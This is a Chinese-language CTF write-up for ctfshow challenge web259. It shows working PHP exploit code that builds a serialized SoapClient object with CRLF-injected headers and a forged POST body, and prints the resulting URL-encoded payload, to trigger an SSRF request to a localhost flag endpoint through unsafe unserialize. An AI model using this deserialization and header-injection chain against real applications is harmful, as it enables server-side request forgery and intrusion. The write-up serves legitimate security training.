## **利用自带的SoapClient类，调用__call发送ssrf请求**
web259
触发点
```
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();  //触发__call调用
```

```
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1',
    'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'yn8rt^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);
?>
  
//运行结果
O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A235%3A%22yn8rt%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```
```
<?php
$ua="ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>"127.0.0.1/",'location'=>"http://127.0.0.1/flag.php",'user_agent'=>$ua));
echo urlencode(serialize($client))
?>
```

<http://127.0.0.1/flag.php>需要接收的
```
flag.php

$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```